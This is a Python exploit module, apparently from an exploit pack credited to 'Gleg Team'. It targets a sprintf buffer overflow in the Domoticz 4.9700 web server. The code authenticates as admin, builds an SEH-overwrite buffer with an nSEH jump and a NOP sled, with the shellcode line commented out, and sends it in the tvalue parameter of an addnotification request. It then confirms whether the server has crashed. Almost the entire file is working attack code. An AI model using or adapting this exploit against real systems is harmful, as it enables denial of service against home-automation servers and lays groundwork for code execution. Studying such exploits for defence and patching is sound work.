from Sploit import Sploit
from collections import OrderedDict
import urllib2
from base64 import b64encode
import cookielib
import hashlib
from Shellcodes import OSShellcodes
from ShellUtils import Constants
from struct import pack
import urllib
import socket

INFO = {}
INFO['NAME'] = "efs_domoticz_4_9700_bo"
INFO['DESCRIPTION'] = "Domoticz 4.9700 SEH-based Buffer Overflow/Denial of Service"
INFO['VENDOR'] = "https://www.domoticz.com/"
INFO['CVE Name'] = ""
INFO['NOTES'] = """The specific flaw lies within CWebServer::HandleCommand method in WebServer.cpp.
Usage of insecure method sprintf (line 5839, as per 08 April 2019) results in buffer overflow, which in turn allows to overwrite SEH pointers.
However, it is still questionable if it is possible to achieve arbitrary code execution, so DoS for now.

Authorization is required. Level: admin.
Tested on Windows 7 x64, Domoticz 4.9700
"""
INFO['DOWNLOAD_LINK'] = "https://www.domoticz.com/downloads/"
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = ""
INFO['PATH'] = "Exploits/"
INFO['AUTHOR'] = "08 Apr 2019, Gleg Team"

OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.217", dict(description='Target host')
OPTIONS["PORT"] = 8081, dict(description='Target port')
OPTIONS["BASEPATH"] = '/'
OPTIONS["LOGIN"] = '', dict(description='Login. Leave empty if authorization is not required.')
OPTIONS["PASSWORD"] = '', dict(description='Password')


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.host = '127.0.0.1'
        self.port = 8080
        self.basepath = '/'
        self.protocol = 'http'
        self.login = ''
        self.password = ''

    def args(self):
        self.args = Sploit.args(self, OPTIONS)

        self.host = self.args.get("HOST", self.host)
        self.port = self.args.get("PORT", self.port)
        self.basepath = self.args.get("BASEPATH", self.basepath)
        self.login = self.args.get("LOGIN", self.login)
        self.password = self.args.get("PASSWORD", self.password)

        self.protocol = 'https' if self.check_ssl() else 'http'

        urllib2.install_opener(
            urllib2.build_opener(
                urllib2.HTTPCookieProcessor(
                    cookielib.CookieJar()
                )
            )
        )


    def check_ssl(self):
        self.log('[*] Checking if server uses HTTPS...')
        url = 'https://{}:{}/{}/login.htm'.format(self.host, self.port, self.basepath)

        try:
            urllib2.urlopen(url)
            self.log('[*] Server uses HTTPS')
            return True
        except urllib2.URLError as ex:
            pass
        
        self.log('[*] Server uses HTTP')
        return 

    def authorize(self):
        if not self.login:
            return

        self.login = b64encode(self.login).replace('=', '%3d')
        m = hashlib.md5()
        m.update(self.password)
        self.password = m.hexdigest()

        url = self.make_url('/json.htm?type=command&param=logincheck&username={}&password={}&rememberme=true'.format(self.login, self.password))
        try:
            r = urllib2.urlopen(url).read()
        except:
            self.log('[-] Failed to authorize')
            self.finish(False)

    def create_payload(self):

        payload = 'A' * 300
        payload += pack('<I', 0x9090F9EB)  # nseh
        payload += pack('<I', 0xABABABAB)  # seh
        payload += '\x90\x90\x90\x90' * 10
        # payload += shellcode
        payload += '\x90'* (1000 - len(payload))
        payload = urllib.quote(payload)

        return payload

    def send_payload(self):
        payload = self.create_payload()

        url = '/json.htm?idx=2&param=addnotification&tmsg=&tpriority=0&trecovery=false&tsendalways=false&tsystems=&ttype=1'
        url += '&tvalue=' + payload
        url += '&twhen=2&type=command'
        url = self.make_url(url)

        try:
            urllib2.urlopen(url, timeout=3)
        except socket.timeout:
            pass

    def check_is_down(self):
        url = self.make_url('/')

        try:
            urllib2.urlopen(url, timeout=5)
            self.log('[-] The server is still up')
            return False
        except socket.timeout:
            pass

        self.log('[+] Confirmed. The server is down')
        return True

    def make_url(self, url):
        return '{}://{}:{}{}{}'.format(self.protocol, self.host, self.port, self.basepath, url.strip('/\\'))

    def run(self):
        self.args()
        self.authorize()
        self.send_payload()
        if self.check_is_down():
            self.finish(True)
        else:
            self.finish(False)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()